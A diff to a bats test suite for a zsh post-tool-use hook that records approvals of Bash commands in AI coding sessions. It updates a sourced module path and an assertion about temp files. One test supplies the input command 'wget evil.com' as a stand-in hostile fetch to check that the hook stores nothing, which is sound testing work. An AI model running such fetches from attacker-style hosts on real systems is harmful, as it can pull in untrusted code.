@@ -5,7 +5,7 @@ setup() {
   SCRIPT="$BATS_TEST_DIRNAME/../postToolUse-Bash"
   export CLAUDE_SESSIONS_DIR="$BATS_TMP_DIR"
   # Module calls run as session "test", like the hook input below
-  approvalPrefix="CLAUDE_SESSION_ID=test; source '${BATS_TEST_DIRNAME}/../Bash-approval.zsh'"
+  approvalPrefix="CLAUDE_SESSION_ID=test; source '${BATS_TEST_DIRNAME}/../lib/approval-memory.zsh'"
 }
 
 @test "post event for a pending tool use id increments the count of each of its commands" {
@@ -82,7 +82,8 @@ setup() {
   bats_run_zsh "$SCRIPT" <<<'{"tool_use_id":"toolu_01","tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
   [[ "$status" -eq 0 ]]
   [[ "$output" = "" ]]
-  [[ "$(ls --almost-all "$BATS_TMP_DIR")" = "" ]]
+  # bats_tmp_dir itself writes mock.zsh: only files written by the hook count
+  [[ "$(ls --almost-all "$BATS_TMP_DIR")" = "mock.zsh" ]]
 }
 
 @test "post hook does not run solkan" {
